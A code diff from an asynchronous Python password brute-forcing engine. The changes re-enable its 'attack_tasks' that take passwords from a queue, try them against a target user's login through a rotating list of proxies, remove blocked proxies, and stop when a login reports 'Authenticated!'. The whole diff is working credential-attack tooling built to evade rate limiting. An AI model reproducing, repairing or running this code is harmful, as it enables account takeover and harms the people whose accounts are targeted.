@@ -49,32 +49,6 @@ class EngineAsync(Engine):
 
         self.proxy_list = []
 
-        # Just to make sure we are removing them correctly
-        self.removed_proxies = []
-
-    def _handle_login_api_error(self, e, log, proxy):
-        """
-        OLD CODE:
-
-        Not currently being used, but we are going to have to deal with the
-        GENERIC_REQUEST_ERROR when we start trying to login.
-
-        We need a way to distinguish between a bad proxy error that should
-        result in the proxy being updated or an error that requires just
-        sleeping and maintaining the same proxy, since if results is None,
-        the method will just update the proxy.
-        """
-        if e.__sleep__:
-            log.warn(f'{e.__class__.__name__}... Sleeping {proxy.ip}')
-            time.sleep(0.5)
-        elif isinstance(e, exceptions.ApiBadProxyException):
-            log.warn(f'{e.__class__.__name__} Bad Proxy {proxy.ip}')
-        elif isinstance(e, exceptions.ApiClientException):
-            if e.error_type == settings.GENERIC_REQUEST_ERROR:
-                log.warn(f'Found Bad Proxy w Generic Request Error {proxy.ip}')
-            else:
-                raise e
-
     @auto_logger
     async def populate_passwords(self, loop, log):
         """
@@ -209,11 +183,11 @@ class EngineAsync(Engine):
             tokens = await asyncio.ensure_future(self.get_tokens(loop))
 
             attack_tasks = (
-                # loop.create_task(
-                #     self.handle_exception(
-                #         self.consume_passwords(tokens, loop), loop
-                #     )
-                # ),
+                loop.create_task(
+                    self.handle_exception(
+                        self.consume_passwords(tokens, loop), loop
+                    )
+                ),
                 loop.create_task(
                     self.handle_exception(
                         self.consume_attempts(loop), loop
@@ -248,24 +222,29 @@ class EngineAsync(Engine):
             if exc:
                 if isinstance(exc, exceptions.BadProxyException):
                     self.log.warn(str(exc))
-                    self.proxy_list.remove(proxy)
+                    self.proxy_list.remove(exc.proxy)
+                else:
+                    self.log.errors(str(exc))
 
-                    # Storing temporarily to make sure we are removing them and not
-                    # using them again.
-                    self.removed_proxies.append(proxy)
-                else:
-                    raise exc
-            else:
-                result = fut.result()
-                if result.accessed:
-                    log.success(f"Authenticated!")
-                    self.stop_event.set()
-                else:
-                    self.attempts.put_nowait(password)
+        # def callback(fut):
+        #     exc = fut.exception()
+        #     if exc:
+        #         if isinstance(exc, exceptions.BadProxyException):
+        #             self.log.warn(str(exc))
+        #             self.proxy_list.remove(proxy)
+        #         else:
+        #             raise exc
+        #     else:
+        #         result = fut.result()
+        #         if result.accessed:
+        #             log.success(f"Authenticated!")
+        #             self.stop_event.set()
+        #         else:
+        #             self.attempts.put_nowait(password)
 
         while not self.stop_event.is_set():
             try:
-                password = queue.get_nowait()
+                password = self.passwords.get_nowait()
             except asyncio.QueueEmpty:
                 continue
             else:
@@ -276,7 +255,6 @@ class EngineAsync(Engine):
                     while not self.stop_event.is_set() and len(self.proxy_list):
                         async with self.lock:
                             proxy = self.proxy_list[0]
-                            assert proxy not in self.removed_proxies
 
                         task = asyncio.ensure_future(session.login(
                             self.user.username,
@@ -290,9 +268,10 @@ class EngineAsync(Engine):
 
                     await asyncio.gather(*tasks, return_exceptions=True)
 
-        [task.cancel() for task in tasks]
-
     async def handle_exception(self, coro, loop):
+        """
+        This does not seem to be working properly for all situations.
+        """
         try:
             await coro
         except Exception as e:
